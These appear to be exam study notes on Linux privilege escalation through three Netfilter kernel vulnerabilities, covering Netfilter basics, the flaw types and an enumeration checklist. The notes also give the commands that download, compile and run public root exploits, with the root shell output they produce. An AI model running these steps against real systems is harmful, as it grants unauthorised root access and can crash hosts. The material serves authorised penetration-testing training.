## 1. What is Netfilter?

**Netfilter** is a Linux kernel framework/module that handles network traffic.

It provides functionality including:

- Packet filtering
    
- Network Address Translation (**NAT**)
    
- Connection tracking
    
- Packet manipulation
    

Programs such as:

```text
iptables
arptables
```

act through Netfilter's hook system.

### Basic flow

```text
Incoming / Outgoing Packet
          │
          ▼
      Netfilter
          │
     ┌────┼────┐
     ▼    ▼    ▼
  Filter  NAT  Tracking
     │
     ▼
Target Application
```

---

# 2. Three Main Functions

According to the module, Netfilter has three main functions:

### 1. Packet defragmentation

Handles fragmented IP packets.

### 2. Connection tracking

Tracks network connections and their state.

### 3. Network Address Translation

Performs **NAT**, allowing addresses to be translated between networks.

---

# 3. Why Netfilter Matters for Privilege Escalation

Netfilter operates inside the **Linux kernel**.

Therefore, a vulnerability in Netfilter can potentially allow an unprivileged local user to manipulate kernel memory and execute code with **kernel/root privileges**.

```text
Unprivileged User
       │
       ▼
Netfilter vulnerability
       │
       ▼
Kernel memory corruption
       │
       ▼
Kernel code execution
       │
       ▼
     root
```

Several Netfilter vulnerabilities have resulted in Linux privilege escalation, including:

```text
CVE-2021-22555
CVE-2022-1015
CVE-2022-25636
CVE-2023-32233
```

---

# 4. Why Old Linux Systems Matter

Organizations sometimes continue using older Linux distributions because their applications depend on specific versions of the operating system or kernel.

Updating the OS/kernel may require:

```text
New OS/kernel
      │
      ├── Application compatibility
      ├── Configuration changes
      ├── Testing
      └── Deployment
```

This can be expensive or risky for production environments.

Therefore:

> **Old kernel = potentially larger attack surface.**

Containers and VMs do not automatically eliminate this problem because they ultimately depend on a host kernel.

---

# 5. CVE-2021-22555

### Affected kernel versions

The module states:

```text
Linux kernel 2.6 → 5.11
```

Example:

```bash
uname -r
```

Output:

```text
5.10.5-051005-generic
```

This falls within the range described by the module.

---

## Exploitation Workflow

The module uses Google's PoC.

Download:

```bash
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
```

Compile:

```bash
gcc -m32 -static exploit.c -o exploit
```

Execute:

```bash
./exploit
```

The exploit performs kernel memory corruption and eventually provides a root shell.

Verify:

```bash
id
```

Expected:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### Memory chain

```text
uname -r
   ↓
5.10.5
   ↓
CVE-2021-22555
   ↓
Netfilter memory corruption
   ↓
Kernel exploitation
   ↓
root
```

---

# 6. CVE-2022-25636

The module describes another Netfilter vulnerability:

```text
CVE-2022-25636
```

It exists in:

```text
net/netfilter/nf_dup_netdev.c
```

and involves a:

> **Heap out-of-bounds write**

The module states that it affects Linux kernels:

```text
5.4 → 5.6.10
```

### Important caution

The provided example then shows:

```bash
uname -r
```

with:

```text
5.13.0-051300-generic
```

That version does **not** fall within the affected range stated immediately above.

So for CPTS notes, keep these as two separate facts rather than assuming the example proves that `5.13.0` is vulnerable.

---

## Exploit Behavior

The module's PoC performs several stages:

```text
STEP 1
Leak net_device pointers
        ↓
STEP 2
Heap spraying / overwrite
        ↓
STEP 3
Reallocate freed structure
        ↓
STEP 4
Leak KASLR
        ↓
STEP 5
Reallocate again
        ↓
STEP 6
ROP
        ↓
root
```

Example compilation:

```bash
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
```

Execution:

```bash
./exploit
```

The module shows:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### Warning

This exploit can **corrupt the kernel** and may require a reboot before the system becomes usable again.

---

# 7. CVE-2023-32233

Another Netfilter vulnerability covered in the module:

```text
CVE-2023-32233
```

This involves:

```text
nf_tables
```

and specifically an **anonymous sets Use-After-Free (UAF)** vulnerability.

---

## What are Anonymous Sets?

They are temporary workspaces used while processing `nf_tables` batch requests.

The intended lifecycle is:

```text
Create set
   ↓
Use set
   ↓
Batch processing complete
   ↓
Clear / free set
   ↓
No further access
```

The vulnerability occurs because the cleared-out anonymous set can still be accessed and modified.

```text
Anonymous Set
      │
      ▼
    Freed
      │
      X
      │
      ▼
Still accessible
      │
      ▼
Use-After-Free
      │
      ▼
Kernel memory manipulation
      │
      ▼
Potential root
```

---

# 8. CVE-2023-32233 PoC

Clone:

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
```

Enter directory:

```bash
cd CVE-2023-32233
```

Compile:

```bash
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

Execute:

```bash
./exploit
```

The module's example eventually reports:

```text
You've Got ROOT:-)
```

Verify:

```bash
id
```

Result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

# 9. Compare the Netfilter Vulnerabilities

|CVE|Core technique|Module's stated affected range|
|---|---|---|
|**CVE-2021-22555**|Memory corruption / out-of-bounds write|Kernel 2.6–5.11|
|**CVE-2022-25636**|Heap out-of-bounds write|5.4–5.6.10|
|**CVE-2023-32233**|Use-After-Free in `nf_tables` anonymous sets|Up to 6.3.1|

### Memory trick

```text
2021 → OOB / memory corruption
2022 → Heap OOB
2023 → UAF
```

---

# 10. CPTS Enumeration Methodology

This is the most important part for the exam.

When you suspect a kernel/Netfilter exploit:

### Step 1 — Identify kernel

```bash
uname -r
```

or:

```bash
uname -a
```

### Step 2 — Determine exact kernel

Don't just record:

```text
5.x
```

Record the complete version:

```text
5.10.5-051005-generic
```

### Step 3 — Match against known vulnerabilities

```text
Kernel version
      │
      ▼
Known CVEs
      │
      ▼
Affected version?
      │
      ▼
Target configuration?
      │
      ▼
PoC
      │
      ▼
root
```

### Step 4 — Verify

After exploitation:

```bash
id
```

The key indicator:

```text
uid=0(root)
```

---

# 11. Kernel Exploit Decision Tree

Don't immediately jump to kernel exploits.

Your overall Linux privesc methodology should be:

```text
Initial Access
     │
     ▼
Enumeration
     │
     ├── sudo -l
     ├── SUID
     ├── Capabilities
     ├── Groups
     ├── Cron
     ├── Services
     ├── Credentials
     ├── Containers
     └── Kernel
             │
             ▼
        Exact kernel?
             │
             ▼
       Known vulnerability?
             │
        ┌────┴────┐
        ▼         ▼
       Yes        No
        │         │
        ▼         ▼
   Verify      Continue
   conditions  enumeration
        │
        ▼
      PoC
        │
        ▼
      root
```

---

# 12. Important Warning

Kernel exploits are different from many user-space misconfigurations you've studied.

They can cause:

- Kernel crashes
    
- System instability
    
- Memory corruption
    
- Service disruption
    
- Required reboot
    

So the CPTS mindset is:

> **Enumerate normal privilege-escalation vectors first. Use a kernel exploit when it is actually necessary and the exact target conditions match.**

---

# 🔥 CPTS Memory Sheet

```text
NETFILTER
   │
   ├── Firewall / packet manipulation
   ├── Connection tracking
   └── NAT
        │
        ▼
   Kernel-level attack surface
        │
        ├── CVE-2021-22555
        │      └── Memory corruption
        │
        ├── CVE-2022-25636
        │      └── Heap OOB
        │
        └── CVE-2023-32233
               └── UAF / nf_tables
                      │
                      ▼
                  Kernel abuse
                      │
                      ▼
                     root
```

### ⭐ Exam rule

> **`uname -r` → exact kernel → match CVE → verify affected conditions → exploit → `id` → `uid=0(root)`**

Also remember: **a kernel version appearing inside a vulnerability range is a strong lead, not by itself proof that the installed kernel is exploitable**; patches and build-specific changes matter.